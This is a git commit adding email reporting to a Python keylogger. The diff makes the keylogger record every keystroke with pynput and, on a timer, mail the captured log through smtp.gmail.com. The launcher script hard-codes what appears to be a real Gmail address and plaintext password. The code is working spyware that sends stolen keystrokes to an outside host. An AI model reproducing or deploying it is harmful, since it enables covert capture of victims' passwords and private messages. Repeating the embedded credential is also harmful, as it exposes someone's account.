1dcf718fd154242ee1dee88e724f2538a7c41b26
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-09 11:34:06 +0700

    Keylogger with sending reports to email

--- keylogger.py
+++ keylogger.py
@@ -1,26 +1,40 @@
 import pynput.keyboard
 import threading
-
-log = ""
+import smtplib
 
 
 class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(5, self.report)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
--- zlogger.py
+++ zlogger.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
+my_keylogger = keylogger.Keylogger(120, "sereganazemcev@gmail.com", "22833720041917Master")
 my_keylogger.start()
